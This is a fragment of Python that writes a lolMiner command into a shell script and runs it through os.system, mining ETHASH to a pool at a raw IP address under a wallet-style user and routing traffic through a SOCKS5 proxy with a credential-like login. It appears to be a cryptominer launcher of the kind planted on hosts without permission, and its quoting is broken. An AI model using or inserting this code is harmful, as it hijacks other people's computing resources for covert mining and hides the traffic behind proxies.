...
os.system('echo "./lolMiner --algo ETHASH --pool 216.250.118.159:443 --user 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM.rknew - export proxy socks5://sshocean-yangkai:51.79.157.223:443
os.system('sleep 2')
os.system('sh tes')
